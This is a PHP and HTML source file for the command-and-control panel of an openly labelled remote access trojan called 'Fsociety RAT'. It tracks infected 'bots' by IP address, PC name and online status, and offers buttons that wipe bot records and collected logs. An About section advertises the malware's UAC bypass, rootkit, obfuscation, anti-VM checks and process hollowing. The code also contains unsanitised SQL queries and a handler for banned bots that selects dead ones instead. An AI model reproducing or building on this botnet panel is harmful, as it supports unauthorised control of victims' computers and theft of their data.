<?php
        /*
        ##################################################
        #                                                #
        #         Malware Coder: Elliot Alderson         #
        #                                                #
        #   Github: https://github.com/ElliotAlderson51  #
        #                                                #
        ##################################################
        */
    include 'db.php';

    $db = new db;

    if(!isset($_SESSION['user_login_control_success']))
    {
        header("Location: index.php");
    }

    $sql = "SELECT * FROM bots WHERE isDead='0' AND isBanned='0'";
    $result = mysqli_query($db->conn, $sql);

    if(mysqli_num_rows($result) > 0)
    {
        while($row = mysqli_fetch_array($result))
        {
            $bot_id = $row['bot_id'];
            $last_seen = $row['last_seen'];

            $datetime1 = new DateTime($last_seen); //start time

            $date = date('Y-m-d H:i:s');
            $datetime2 = new DateTime($date); //end time

            $interval = $datetime1->diff($datetime2);
            $minutes = $interval->format('%i');
            $month = $interval->format('%m');

            if($month >= 1)
            {
                $sql = "UPDATE bots SET isDead='1' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
            else if($minutes >= 1)
            {
                $sql = "UPDATE bots SET status='0' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }
    }

    // Settings

    if(isset($_POST['delete_deads']))
    {
        $sql = "SELECT * FROM bots WHERE isDead='1'";
        $result = mysqli_query($db->conn, $sql);

        if(mysqli_num_rows($result) > 0)
        {
            while($row = mysqli_fetch_array($result))
            {
                $bot_id = $row['bot_id'];

                $sql = "DELETE FROM commands WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);

                $sql = "DELETE FROM bots WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }
    }

    if(isset($_POST['delete_banned']))
    {
        $sql = "SELECT * FROM bots WHERE isDead='1'";
        $result = mysqli_query($db->conn, $sql);

        if(mysqli_num_rows($result) > 0)
        {
            while($row = mysqli_fetch_array($result))
            {
                $bot_id = $row['bot_id'];

                $sql = "DELETE FROM commands WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);

                $sql = "DELETE FROM bots WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }
    }

    if(isset($_POST['delete_all_logs']))
    {
        $sql = "SELECT * FROM bots";
        $result = mysqli_query($db->conn, $sql);

        if(mysqli_num_rows($result) > 0)
        {
            while($row = mysqli_fetch_array($result))
            {
                $bot_id = $row['bot_id'];

                $file_path = "log_".$bot_id.".txt";
                if(file_exists($file_path))
                {
                    unlink($file_path);
                }
            }
        }
    }

    if(isset($_POST['delete_everything']))
    {
        $sql = "DELETE FROM bots";
        mysqli_query($db->conn, $sql);

        $sql = "DELETE FROM commands";
        mysqli_query($db->conn, $sql);

        $files = glob('bots_info/*'); // get all file names
        foreach($files as $file){ // iterate files
            if(is_file($file)) {
                unlink($file); // delete file
            }
        }


    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fsociety RAT Control</title>

    <link rel="stylesheet" href="css/Control.css">


    <script src="js/jquery-3.4.1.min.js"></script>
</head>
<body>
    
    <nav>
        <label>Fsociety RAT</label>

        <form action="bot_profile.php" method="GET">
            <input type="text" name="bot" placeholder="Bot ID/PC Name">
            <button type="submit">Search</button>
        </form>
    </nav>

    <div class="second_nav">
        <a href="#" onclick="show_control()">Control</a>
        <div class="center">
            <a href="#" onclick="show_about()">About</a>
        </div>
        <a href="#" onclick="show_settings()">Settings</a>
    </div>

    <div class="control">
        <table>

            <tr>
                <th>Bot ID</th>
                <th>IP Address</th>
                <th>PC Name</th>
                <th>Status</th>
                <th>GPU</th>
                <th>isBanned</th>
                <th>isDead</th>
                <th>Last Seen</th>
            </tr>

            <?php

                // Prints the bots into a table

                $sql = "SELECT * FROM bots ORDER BY (favorite is true) desc";
                $result = mysqli_query($db->conn, $sql);
                if(mysqli_num_rows($result) != 0)
                {
                    while($row = mysqli_fetch_array($result))
                    {
                        echo "<tr>";
                        $bot_id = $row['bot_id'];

                        echo "<td><a href='bot_profile.php?bot=".$bot_id."'>".$bot_id."</a></td>";
                        echo "<td>".$row['ip_address']."</td>";
                        echo "<td>".$row['pc_name']."</td>";
                        echo "<td>"; if($row['status'] == "0") echo 'Offline'; else echo 'Online'; echo '</td>';
                        echo "<td>".$row['gpu']."</td>";
                        echo "<td>"; if($row['isBanned'] == "1") echo "Yes"; echo "</td>";
                        echo "<td>"; if($row['isDead'] == "1") echo "Yes"; echo "</td>";
                        echo "<td>".$row['last_seen']."</td>";

                        

                        echo "</tr>";

                    }
                }

            ?>
            

        </table>

       
    </div>

    <div class="settings">
        
        <form action="#" method="POST">
            <button type="submit" name="delete_deads">Delete Dead Bots</button>
            <button type="submit" name="delete_banned">Delete Banned Bots</button>
            <button type="submit" name="delete_all_logs">Delete Bots Log Files</button>
            <button type="submit" name="delete_everything">Delete Everyting!!</button>
        </form>
                
    </div>

    <div class="about">
        <div class="center">
            But I’m only a vigilante hacker by night. By day, just a regular cyber security engineer, employee number ER28-0652.
        </div>

        <br>

        <div class="me">
            Hello friend! As you can see I really love the TV show MR. Robot.
             This is an open-source project on my <a href="https://github.com/ElliotAlderson51" target="_blank"> github </a>. It was very fun to work on this project.
             I study a lot I have to study how to write my first <a href="https://github.com/ElliotAlderson51/Kernel-Rootkit-32Bit" target="_blank"> rootkit </a>, how to obfuscate imports & strings, bypass UAC, Anti-VM techniques and more...
             <br>
             My website: <a href="https://elliotalderson51.github.io/Fsociety/" target="_blank"> https://elliotalderson51.github.io/Fsociety/ </a>
             <br><br>

             <h2>Malware Info:</h2>
             
             Little info about the malware: The malware bypassing UAC, installing rootkit on 32 bit systems, obfuscated strings and imports, Anti-VM technique, Process Hollowing , Communicate with the website control using CURL (curl is preinstalled in every windows!), and MORE!
        
            <br><br>

            <h2>Books Recommendations:</h2>

            <a href="https://www.amazon.com/Windows-Kernel-Programming-Pavel-Yosifovich/dp/1977593372"> Windows Kernel Programming</a> by Pavel Yosifovich </br>
            <a href="https://www.amazon.com/Rootkit-Arsenal-Escape-Evasion-Corners-dp-144962636X/dp/144962636X/ref=dp_ob_image_bk">The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System 2nd Edition</a> by Bill Blunden <br>
            <a href="https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901">Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software 1st Edition</a> by Michael Sikorski, Andrew Honig <br>

        
        </div>
    </div>

    <div class="bottom_div"></div>

    <footer>
        <a href="https://github.com/ElliotAlderson51" target="_blank">https://github.com/ElliotAlderson51</a>
    </footer>

    <script>

        $(".settings").hide();
        $(".about").hide();

    function show_control()
    {
        $(".control").show();
        $(".settings").hide();
        $(".about").hide();
    }

    function show_settings()
    {
        $(".settings").show();
        $(".control").hide();
        $(".about").hide();
    }

    function show_about()
    {
        $(".about").show();
        $(".control").hide();
        $(".settings").hide();
    }

</script>

</body>
</html>